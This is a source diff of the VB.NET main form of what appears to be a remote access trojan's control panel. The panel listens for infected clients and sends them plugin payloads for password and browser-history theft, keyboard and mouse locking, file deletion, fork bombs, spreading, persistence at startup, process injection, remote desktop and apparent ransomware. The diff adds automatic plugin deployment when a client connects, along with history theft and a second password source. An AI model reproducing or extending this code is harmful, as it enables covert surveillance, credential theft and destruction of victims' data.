@@ -14,22 +14,38 @@ Public Class Form1
     <DllImport("ntdll.dll")>
     Public Shared Function NtTerminateProcess(ByVal hfandle As IntPtr, ByVal ErrorStatus As Integer) As UInteger
     End Function
+    Declare Function SetProcessWorkingSetSize Lib "kernel32.dll" (ByVal process As IntPtr, ByVal minimumWorkingSetSize As Integer, ByVal maximumWorkingSetSize As Integer) As Integer
+    <DllImport("psapi")>
+    Public Shared Function EmptyWorkingSet(ByVal hfandle As IntPtr) As Boolean
+    End Function
     Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
         Me.Close()
-        'PL.MainCL.ST()
     End Sub
     Protected Overrides Sub WndProc(ByRef m As Message)
 
         Select Case m.Msg > 0
+
             Case m.Msg = &H10
+
                 Dim n As Process = Process.GetCurrentProcess
 
                 NtTerminateProcess(n.Handle, 0)
+
         End Select
+
         MyBase.WndProc(m)
+
     End Sub
 
-
+    Public Sub ClearMemory()
+        While True
+            GC.Collect()
+        Task.Run(Sub() GC.WaitForPendingFinalizers())
+        SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
+            EmptyWorkingSet(Process.GetCurrentProcess.Handle)
+            Thread.Sleep(20000)
+        End While
+    End Sub
     Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
         Me.WindowState = FormWindowState.Maximized
     End Sub
@@ -42,7 +58,7 @@ Public Class Form1
         '    Log_Form.Show()
         Timer2.Start()
         MKWFGA.Animations.Animation(Me.Handle, 1000, MKWFGA.Animations.AnimtedFlags.Blend)
-
+        Task.Run(Sub() ClearMemory())
     End Sub
     Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AboutToolStripMenuItem.Click
         ABTForm.Show()
@@ -170,6 +186,7 @@ Public Class Form1
         If UcBtnExt1.BtnText = "Listen !" Then
 
             serve = New TcpListener(IPAddress.Any, NumericUpDown1.Value)
+
             CliSt = New List(Of TcpClient)
 
 
@@ -195,10 +212,6 @@ Public Class Form1
 
             UcBtnExt1.BtnText = "Started !"
 
-
-
-
-
             '
 
 
@@ -207,12 +220,17 @@ Public Class Form1
 
 
             CliSt.Clear()
+
             serve.Stop()
 
 
             AeroListView1.Items.Clear()
+
             CliSt.Clear()
+
+
             RDPViewer.Stop()
+
             UcBtnExt1.BtnText = "Listen !"
 
 
@@ -221,16 +239,19 @@ Public Class Form1
     End Sub
 
 
-
+#Region "Auto Plugins"
     Public Sub AUTOPLG(ByVal TcpCli As TcpClient)
+
         Thread.Sleep(1500)
 
         If Auto_RECOV.Checked = True Then
+
             Dim o As String = PL_PW & "|SP1|" & "|SP2|" & "|ENDING|"
             Dim B As Byte() = Encoding.Default.GetBytes(o)
             Task.Run(Sub() TcpCli.GetStream.WriteAsync(B, 0, B.Length))
 
         End If
+
         Thread.Sleep(1000)
 
 
@@ -239,17 +260,28 @@ Public Class Form1
             Dim o As String = PL_IJCT & "|SP1|" & "" & "|SP2|" & "|EXE|" & "|SP2|" & FILETOEXEC & "|ENDING|"
             Dim B As Byte() = Encoding.Default.GetBytes(o)
             Task.Run(Sub() TcpCli.GetStream.WriteAsync(B, 0, B.Length))
+
         End If
 
+        Thread.Sleep(1000)
 
+        If AUTO_ATS.Checked Then
+
+            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|ATSRP|" & "|ENDING|"
+            Dim B As Byte() = Encoding.Default.GetBytes(o)
+            Task.Run(Sub() TcpCli.GetStream.WriteAsync(B, 0, B.Length))
+
+        End If
 
     End Sub
+#End Region
     Public Async Sub AcceptAndRead(ByVal Context As TaskScheduler)
 
         Try
-            While (True)
-                Dim TcpCLI As TcpClient = serve.AcceptTcpClient
 
+            While (True)
+
+                Dim TcpCLI As TcpClient = serve.AcceptTcpClient
 
                 Task.Run(Sub() Logs_Helper.Log(LOG_AeroListView2, TcpCLI.Client.RemoteEndPoint.ToString & "||" & "Connected !"))
 
@@ -257,35 +289,28 @@ Public Class Form1
 
                 Dim S As Stream = My.Resources.me_too
 
-
-
                 Dim snd As System.Media.SoundPlayer = New System.Media.SoundPlayer(S)
-                snd.Play()
 
+                snd.Play()
 
                 Task.Run(Sub() SenderHelper.SenderHelper(CliSt, TcpCLI.Client.RemoteEndPoint.ToString, "|GETID|"))
 
                 Dim DATA As New StringBuilder
 
-
                 Task.Run(Sub() CheckClient(TcpCLI))
 
-
-
                 Task.Run(Sub() RD(TcpCLI, Context, TcpCLI.Client.RemoteEndPoint.ToString, DATA))
-
-
-
 
                 Dim h As New Thread(Sub() AUTOPLG(TcpCLI))
 
                 h.Start()
 
-
-
             End While
+
         Catch ex As Exception
+
             Exit Sub
+
         End Try
     End Sub
 
@@ -293,21 +318,38 @@ Public Class Form1
     Public Shared TestBytes As Byte() = Encoding.Default.GetBytes("")
     Public Async Sub CheckClient(ByVal k As TcpClient)
         While True
+
             Thread.Sleep(1000)
 
             Try
-
-                Await Task.Run(Sub() k.GetStream.WriteAsync(TestBytes, 0, TestBytes.Length))
+                '   Await Task.Run(Sub() k.GetStream.WriteAsync(TestBytes, 0, TestBytes.Length))
+                Await k.GetStream.WriteAsync(TestBytes, 0, TestBytes.Length)
 
             Catch ex As Exception
                 '  For Each az As ListViewItem In AeroListView1.Items
                 For Each Cli As TcpClient In CliSt
+
                     If Cli.Client.RemoteEndPoint.ToString = k.Client.RemoteEndPoint.ToString Then
 
+                        Try
+
+                            For Each h As ListViewItem In AeroListView1.Items
+
+                                If h.Text = Cli.Client.RemoteEndPoint.ToString Then
+
+                                    AeroListView1.Items.Remove(h)
+
+                                End If
+
+                            Next
+                            '.Remove(AeroListView1.SelectedItems(0))
+                        Catch exS As Exception
+
+                        End Try
 
                         Task.Run(Sub() Logs_Helper.Log(LOG_AeroListView2, k.Client.RemoteEndPoint.ToString & "||" & "Disconnected !"))
-                        CliSt.Remove(k)
 
+                        CliSt.Remove(k)
 
                         Exit Sub
 
@@ -315,7 +357,6 @@ Public Class Form1
                 Next
 
             End Try
-
 
         End While
     End Sub
@@ -327,15 +368,16 @@ Public Class Form1
         Dim VT As New Thread(Sub() Application.Run(foorm))
         Dim FM1 As New FileManager_Form
         Dim TASK1 As New Tasks_Form
-
         Dim INFO1 As New Info_Form
+
         Dim StringHelper As New StringBuilder
+
         While True
+
             Try
 
+                Dim Buffer(2500 * 4096) As Byte
 
-
-                Dim Buffer(5000 * 4096) As Byte
                 Dim lu As Integer = stream.GetStream.Read(Buffer, 0, Buffer.Length)
 
                 If lu > 0 Then
@@ -371,21 +413,23 @@ Public Class Form1
 
 
 
-                        ElseIf Message.EndsWith("|GotThatNice|") Then
+                        ElseIf Message.EndsWith("|FPWD|") Then
 
                             Dim a As New PassRecov_Form
 
                             Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)
 
-                            Dim k As String() = Split(j, "|GotThatNice|")
+                            Dim k As String() = Split(j, "|GPWD|")
 
-                            l.Clear()
+
+
+                            '  l.Clear()
 
 
                             Dim k2 As String() = Split(k(0), Environment.NewLine)
 
 
-                            Task.Run(Sub() SetPasswords(k2, id, a, k))
+                            Task.Run(Sub() SetPasswords(k2, id, a, k, k(1)))
 
 
 
@@ -393,8 +437,20 @@ Public Class Form1
 
 
 
+                        ElseIf Message.EndsWith("|HTWB|") Then
+
+                            Dim o As New Thread(Sub() History_Helper(Buffer, lu, id))
+
+                            o.Start()
+
+                            '  Dim A As New Hist_Form
+
+                            ' Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)
+                            '
+                            ' Dim k2 As String() = Split(j.Replace("|HTWB|", ""), Environment.NewLine)
 
 
+                            '  Task.Run(Sub() SetHistory(k2, id, A))
 
 
 
@@ -406,7 +462,7 @@ Public Class Form1
 
 
                             Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)
-                            l.Clear()
+                            '    l.Clear()
 
 
                             Dim o As String() = Split(j.Replace("|VOL|", ""), Environment.NewLine)
@@ -436,7 +492,7 @@ Public Class Form1
 
                             Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)
                             Dim az As String() = Split(j, "|FILES|")
-                            l.Clear()
+                            '  l.Clear()
 
 
                             Task.Run(Sub() SetFM(az, FM1))
@@ -447,7 +503,7 @@ Public Class Form1
                             Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)
                             Dim h As String = j.Replace("|ENDW|", "")
 
-                            l.Clear()
+                            '  l.Clear()
 
                             Dim aze As New Thread(Sub() B64DW(h))
 
@@ -464,7 +520,7 @@ Public Class Form1
 
                             Task.Run(Sub() Logs_Helper.Log(LOG_AeroListView2, id & "||" & "File named  : " & "''" & b & "''" & " has been deleted !"))
 
-                            l.Clear()
+                            '  l.Clear()
                             Task.Run(Sub() DeleteFile(b, FM1))
 
                         ElseIf Message.EndsWith("|DELFALSE|") Then
@@ -482,12 +538,16 @@ Public Class Form1
                         ElseIf Message.EndsWith("|OPENTRUE|") Then
 
 
+
                             Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)
 
                             Dim h As String = j.Replace("|OPENTRUE|", "")
 
 
-                            l.Clear()
+                            '  l.Clear()
+
+
+                            Task.Run(Sub() Logs_Helper.Log(LOG_AeroListView2, id & "||" & "File named " & "''" & h & "''" & " has been opened !"))
 
                             Task.Run(Sub() OpenFile(h))
 
@@ -497,7 +557,9 @@ Public Class Form1
                             Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)
 
                             Dim h As String = j.Replace("|OPENFALSE|", "")
-                            l.Clear()
+                            '    l.Clear()
+
+                            Task.Run(Sub() Logs_Helper.Log(LOG_AeroListView2, id & "||" & "File named  " & "''" & h & "''" & " couldn't be opened !"))
 
                             Task.Run(Sub() OpenFileFailed(h))
 
@@ -508,7 +570,7 @@ Public Class Form1
                             TASK1 = New Tasks_Form
                             Dim h As String = j.Replace("|TASKF|", "")
 
-                            l.Clear()
+                            '  l.Clear()
 
                             Dim h2 As String() = Split(h, Environment.NewLine)
 
@@ -525,7 +587,7 @@ Public Class Form1
                             Dim UTF8 As String = Encoding.UTF8.GetString(Buffer, 0, lu)
                             Dim h As String = UTF8.Replace("|TASKF||OLD|", "")
 
-                            l.Clear()
+                            '   l.Clear()
 
                             Dim h2 As String() = Split(h, Environment.NewLine)
 
@@ -547,7 +609,7 @@ Public Class Form1
 
                             Dim h As String = UTF8.Replace("|RK|", "")
 
-                            l.Clear()
+                            '   l.Clear()
 
                             Dim h2 As String() = Split(h, "|/\|")
 
@@ -621,6 +683,7 @@ Public Class Form1
 
 
                         ElseIf message.EndsWith("|STPDSK|") Then
+
                             foorm = New RViewerForm
 
                             VT = New Thread(Sub() Application.Run(foorm))
@@ -631,15 +694,13 @@ Public Class Form1
 
                             Dim Data As String = j.Replace("|ENDPROCINFO|", "")
 
-
-
                             Task.Run(Sub() SetPROCINFO(Data))
 
                         ElseIf message.EndsWith("CRYPTO|") Then
+
                             Dim Chk As New Thread(Sub() EncDecChecker(Message))
+
                             Chk.Start()
-
-
 
 
                         ElseIf Message.EndsWith("|MTB|") Then
@@ -649,6 +710,15 @@ Public Class Form1
                             Dim Chk As New Thread(Sub() MTBCheck(UTF8, id, FM1))
 
                             Chk.Start()
+
+
+                        ElseIf Message.EndsWith("|FI|") Then
+
+                            Dim UTF8 = Encoding.UTF8.GetString(Buffer, 0, lu)
+
+                            Dim Set_FI As New Thread(Sub() SetFI(UTF8))
+
+                            Set_FI.Start()
 
                         End If
 
@@ -859,6 +929,20 @@ Public Class Form1
 #End Region
 
 #Region "File Manager Helper"
+
+    Public Sub SetFI(ByVal FI As String)
+
+        Dim Fi_F As New FileInfo_Form
+        Dim SP As String() = Split(FI.Replace("|FI|", ""), "||")
+        Fi_F.RichTextBox1.Text = SP(0)
+
+        Fi_F.RichTextBox2.Text = SP(1)
+        Fi_F.RichTextBox3.Text = SP(2)
+        Fi_F.Label1.Text = SP(3)
+
+        Dim j As New Thread(Sub() Application.Run(Fi_F))
+        j.Start()
+    End Sub
     Public Sub MTBCheck(ByVal P As String, ByVal ID As String, ByVal FM1 As FileManager_Form)
 
 
@@ -885,20 +969,32 @@ Public Class Form1
         End If
     End Sub
     Public Async Sub B64DW(ByVal K As String)
-        Dim o As String() = Split(K, "|DW|")
+        Try
 
-        Dim h As New Thread(Sub() GetFile(o(0), o(1)))
-        h.Start()
+            Dim o As String() = Split(K, "|DW|")
+
+            Dim h As New Thread(Sub() GetFile(o(0), o(1)))
+            h.Start()
+        Catch ex As Exception
+
+        End Try
     End Sub
     Public Async Sub GetFile(ByVal B64 As String, ByVal Name As String)
+
         MessageBox.Show("Data of file : " & Name & "have been downloaded ! Now they will be written !")
-        Dim h As Byte() = Await Task.Run(Function() Convert.FromBase64String(B64))
-
-        IO.File.WriteAllBytes(Name, h)
+        Try
 
 
-        GC.Collect()
-        GC.WaitForPendingFinalizers()
+            Dim h As Byte() = Await Task.Run(Function() Convert.FromBase64String(B64))
+
+            IO.File.WriteAllBytes(Name, h)
+
+
+            GC.Collect()
+            GC.WaitForPendingFinalizers()
+        Catch ex As Exception
+            MessageBox.Show("Something went wrong with those data !")
+        End Try
     End Sub
     Public Async Sub ComBoBoxHandler(ByVal l As ComboBox, ByVal P As FileManager_Form)
 
@@ -1018,14 +1114,88 @@ Public Class Form1
 
 #End Region
 
-#Region "PassWords Checker"
-    Public Sub SetPasswords(ByVal K2 As String(), ByVal ID As String, ByVal a As PassRecov_Form, ByVal k As String())
+#Region "WebBrowsers Checker"
+
+    Public Sub History_Helper(ByVal Buffer As Byte(), ByVal L As Integer, ByVal ID As String)
+
+
+        Dim A As New Hist_Form
+
+        Dim j As String = Encoding.UTF8.GetString(Buffer, 0, L)
+
+        Dim k2 As String() = Split(j.Replace("|HTWB|", ""), Environment.NewLine)
+
+
+        Task.Run(Sub() SetHistory(k2, ID, A))
+    End Sub
+    Public Sub SetHistory(ByVal HIST_LOG As String(), ByVal ID As String, ByVal a As Hist_Form)
+
+        Task.Run(Sub() Logs_Helper.Log(LOG_AeroListView2, ID & "||" & "Successfully recovered history !"))
+
+        a.Label1.Text = ID
+
+        Dim kn As ListViewItem
+
+
+        For Each pk As String In HIST_LOG
+
+            If pk.StartsWith("Application") Then
+
+                kn = New ListViewItem
+                Dim Splitter As String = pk.Replace("Application:", "")
+                kn.Text = Splitter
+            End If
+
+
+
+            If pk.StartsWith("Title") Then
+
+                If kn.Text.Length > 0 Then
+
+                    Dim Splitter As String = pk.Replace("Title:", "")
+                    kn.SubItems.Add(Splitter)
+
+                End If
+            End If
+
+            If pk.StartsWith("URL") Then
+
+
+                If kn.Text.Length > 0 Then
+                    Dim Splitter As String = pk.Replace("URL:", "")
+                    kn.SubItems.Add(Splitter)
+                End If
+            End If
+
+
+            If pk.StartsWith("LV") Then
+
+
+                If kn.Text.Length > 0 Then
+                    Dim Splitter As String = pk.Replace("LV:", "")
+                    kn.SubItems.Add(Splitter)
+
+                    a.ListView1.Items.Add(kn)
+
+                End If
+
+
+            End If
+
+
+        Next
+
+
+        Application.Run(a)
+
+    End Sub
+    Public Sub SetPasswords(ByVal GPWD As String(), ByVal ID As String, ByVal a As PassRecov_Form, ByVal k As String(), ByVal K3 As String)
         Task.Run(Sub() Logs_Helper.Log(LOG_AeroListView2, ID & "||" & "Successfully recovered passwords !"))
 
         Dim kn As ListViewItem
 
 
-        For Each pk As String In K2
+        For Each pk As String In GPWD
 
             If pk.StartsWith("Url") Then
 
@@ -1072,8 +1242,27 @@ Public Class Form1
 
 
         Next
-        a.Text = "Passwords from : " & ID
-        a.Label1.Text = "Passwords from : " & ID
+
+
+        Dim FPWD As String() = Split(K3.Replace("|FPWD|", ""), Environment.NewLine)
+
+
+        For i = 0 To FPWD.Length - 2
+            Dim FPWD1 As String() = Split(FPWD(i), "|||")
+            Dim n As New ListViewItem
+            n.Text = " " & FPWD1(1)
+            n.SubItems.Add(" " & FPWD1(2))
+            n.SubItems.Add(" " & FPWD1(3))
+            n.SubItems.Add(" " & FPWD1(0))
+
+            a.ListView1.Items.Add(n)
+        Next
+
+
+
+
+
+        a.Label1.Text = ID
 
         If XuiCheckBox1.Checked Then
             Static J As New Random
@@ -1128,14 +1317,16 @@ Public Class Form1
        "\PLUGINS\MISC.dll",
        "\PLUGINS\FM.dll",
        "\PLUGINS\DDOS.dll",
-       "\PLUGINS\TASKS.dll",
+       "\PLUGINS\TSK.dll",
        "\PLUGINS\HWDR.dll",
        "\PLUGINS\DSK.dll",
        "\PLUGINS\MSCT.dll",
        "\PLUGINS\VRSA.dll",
        "\PLUGINS\IJCT.dll",
        "\PLUGINS\ECF1.dll", ''OLD :    "\PLUGINS\ECF.dll"
-      "\PLUGINS\SCRO.dll"
+       "\PLUGINS\SCRO.dll",
+       "\PLUGINS\RNSW.dll",
+       "\PLUGINS\WBBW.dll"
     }
 
 
@@ -1151,13 +1342,15 @@ Public Class Form1
     Public PL_IJCT As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(9)))
     Public PL_ECF1 As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(10)))
     Public PL_SRCO As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(11)))
+    Public PL_RNSW As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(12)))
+    Public PL_WBBW As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(13)))
     '
 #End Region
 
 
 #Region "ToolStrip Clients Sender"
 
-    Private Async Sub GetPasswordsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GetPasswordsToolStripMenuItem.Click
+    Private Async Sub GetPasswordsToolStripMenuItem_Click(sender As Object, e As EventArgs)
         If AeroListView1.SelectedItems.Count = 1 Then
             Dim o As String = PL_PW & "|SP1|" & "|SP2|" & "|ENDING|"
 
@@ -1184,6 +1377,9 @@ Public Class Form1
             Dim o As String = "|CLOSETHISSHIT|"
 
             Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
+
+
+            AeroListView1.Items.Remove(AeroListView1.SelectedItems(0))
 
         End If
     End Sub
@@ -1322,7 +1518,7 @@ Public Class Form1
 
 
 
-            Dim o As String = RViewerForm.PictureBox1.Width & "||"  & RViewerForm.PictureBox1.Height &  "||" & "|SRDV|"
+            Dim o As String = RViewerForm.PictureBox1.Width & "||" & RViewerForm.PictureBox1.Height & "||" & "|SRDV|"
 
             Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
@@ -1450,207 +1646,219 @@ Public Class Form1
 
         If AeroListView1.SelectedItems.Count = 1 Then
 
-
             Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|SWAPOFF|" & "|ENDING|"
 
             Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
+
     End Sub
 
 
 
     Private Async Sub LockKeyboardToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LockKeyboardToolStripMenuItem.Click
-        If AeroListView1.SelectedItems.Count = 1 Then
 
+        If AeroListView1.SelectedItems.Count = 1 Then
 
             Dim o As String = PL_HWDR & "|SP1|" & "" & "|SP2|" & "|STARTKBLG|" & "|ENDING|"
 
             Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
+
     End Sub
 
     Private Async Sub UnlockKeyboardToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UnlockKeyboardToolStripMenuItem.Click
-        If AeroListView1.SelectedItems.Count = 1 Then
 
+        If AeroListView1.SelectedItems.Count = 1 Then
 
             Dim o As String = PL_HWDR & "|SP1|" & "" & "|SP2|" & "|STOPKBLG|" & "|ENDING|"
 
             Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
+
     End Sub
 
 
 
 
     Private Async Sub Test1ToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles Test1ToolStripMenuItem.Click
-        If AeroListView1.SelectedItems.Count = 1 Then
 
+        If AeroListView1.SelectedItems.Count = 1 Then
 
             Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSLKLMV|" & "|ENDING|"
 
             Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
+
     End Sub
 
     Private Async Sub Test2ToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles Test2ToolStripMenuItem.Click
-        If AeroListView1.SelectedItems.Count = 1 Then
 
+        If AeroListView1.SelectedItems.Count = 1 Then
 
             Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSUNLK|" & "|ENDING|"
 
             Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
+
     End Sub
 
     Private Async Sub LeftLockToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LeftLockToolStripMenuItem.Click
-        If AeroListView1.SelectedItems.Count = 1 Then
 
+        If AeroListView1.SelectedItems.Count = 1 Then
 
             Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSLKLEFT|" & "|ENDING|"
 
             Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
+
     End Sub
 
     Private Async Sub LeftUnlockToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LeftUnlockToolStripMenuItem.Click
-        If AeroListView1.SelectedItems.Count = 1 Then
 
+        If AeroListView1.SelectedItems.Count = 1 Then
 
             Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSUNLK|" & "|ENDING|"
 
             Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
+
     End Sub
 
     Private Async Sub RightLockToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RightLockToolStripMenuItem.Click
-        If AeroListView1.SelectedItems.Count = 1 Then
 
+        If AeroListView1.SelectedItems.Count = 1 Then
 
             Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSLKLRIGHT|" & "|ENDING|"
 
             Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
+
     End Sub
 
     Private Async Sub RightUnlockToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RightUnlockToolStripMenuItem.Click
-        If AeroListView1.SelectedItems.Count = 1 Then
 
+        If AeroListView1.SelectedItems.Count = 1 Then
 
             Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSUNLK|" & "|ENDING|"
 
             Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
+
     End Sub
 
     Private Async Sub MouveLockingToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MouveLockingToolStripMenuItem.Click
-        If AeroListView1.SelectedItems.Count = 1 Then
 
+        If AeroListView1.SelectedItems.Count = 1 Then
 
             Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSLKLMV|" & "|ENDING|"
 
             Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
+
     End Sub
 
     Private Async Sub MouveUnlockToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MouveUnlockToolStripMenuItem.Click
-        If AeroListView1.SelectedItems.Count = 1 Then
 
+        If AeroListView1.SelectedItems.Count = 1 Then
 
             Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSUNLK|" & "|ENDING|"
 
             Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
+
     End Sub
 
     Private Async Sub AllLockToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AllLockToolStripMenuItem.Click
-        If AeroListView1.SelectedItems.Count = 1 Then
 
+        If AeroListView1.SelectedItems.Count = 1 Then
 
             Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSLKALL|" & "|ENDING|"
 
             Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
+
     End Sub
 
     Private Async Sub AllUnlockToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AllUnlockToolStripMenuItem.Click
-        If AeroListView1.SelectedItems.Count = 1 Then
 
+        If AeroListView1.SelectedItems.Count = 1 Then
 
             Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSUNLK|" & "|ENDING|"
 
             Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
+
     End Sub
 
     Private Async Sub ShowIconsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowIconsToolStripMenuItem.Click
 
         If AeroListView1.SelectedItems.Count = 1 Then
 
-
             Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|SDI|" & "|ENDING|"
 
             Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
+
     End Sub
 
     Private Async Sub HideIconsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HideIconsToolStripMenuItem.Click
 
         If AeroListView1.SelectedItems.Count = 1 Then
 
-
             Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|HDI|" & "|ENDING|"
 
             Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
+
     End Sub
 
     Private Async Sub ShowStartIconToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowStartIconToolStripMenuItem.Click
         If AeroListView1.SelectedItems.Count = 1 Then
-
 
             Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|SSI|" & "|ENDING|"
 
             Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
+
     End Sub
 
     Private Async Sub StartIconHideToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles StartIconHideToolStripMenuItem1.Click
         If AeroListView1.SelectedItems.Count = 1 Then
-
 
             Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|HSI|" & "|ENDING|"
 
             Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
+
     End Sub
 
     Private Async Sub SpreadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SpreadToolStripMenuItem.Click
         '|SPREAD|
         If AeroListView1.SelectedItems.Count = 1 Then
 
-
             Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|SPREAD|" & "|ENDING|"
 
             Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
+
     End Sub
 
     Private Async Sub AddToStarUpToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AddToStarUpToolStripMenuItem.Click
@@ -1658,32 +1866,29 @@ Public Class Form1
 
         If AeroListView1.SelectedItems.Count = 1 Then
 
-
             Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|ATSRP|" & "|ENDING|"
 
             Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
+
     End Sub
 
     Private Async Sub RedScreenToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RedScreenToolStripMenuItem.Click
         '
-
-
         If AeroListView1.SelectedItems.Count = 1 Then
-
 
             Dim o As String = PL_VRSA & "|SP1|" & "" & "|SP2|" & "|RDSC|" & "|ENDING|"
 
             Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
+
     End Sub
 
 
     Private Async Sub ForkBombToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ForkBombToolStripMenuItem.Click
         '"|FBOMB|"
-
         If AeroListView1.SelectedItems.Count = 1 Then
 
             Dim h As String = InputBox("Set a number : ")
@@ -1693,11 +1898,11 @@ Public Class Form1
             Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
+
     End Sub
 
     Private Async Sub DeleteFilesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteFilesToolStripMenuItem.Click
         If AeroListView1.SelectedItems.Count = 1 Then
-
 
 
             Dim o As String = PL_VRSA & "|SP1|" & "" & "|SP2|" & "|DFOD|" & "|SP2|" & 0 & "|ENDING|"
@@ -1705,6 +1910,7 @@ Public Class Form1
             Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
+
     End Sub
 
     Private Async Sub DeleteFilesRebootToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteFilesRebootToolStripMenuItem.Click
@@ -1712,51 +1918,55 @@ Public Class Form1
 
         If AeroListView1.SelectedItems.Count = 1 Then
 
-
             Dim o As String = PL_VRSA & "|SP1|" & "" & "|SP2|" & "|DFOD|" & "|SP2|" & 1 & "|ENDING|"
 
             Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
         End If
+
     End Sub
 
     Private Async Sub InjectionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles InjectionToolStripMenuItem.Click
         If AeroListView1.SelectedItems.Count = 1 Then
 
             Using l As New OpenFileDialog
-                If l.ShowDialog = DialogResult.OK Then
 
+                If l.ShowDialog = DialogResult.OK Then
 
                     Dim o As New Injector_Form
 
                     o.Label4.Text = AeroListView1.SelectedItems(0).Text
 
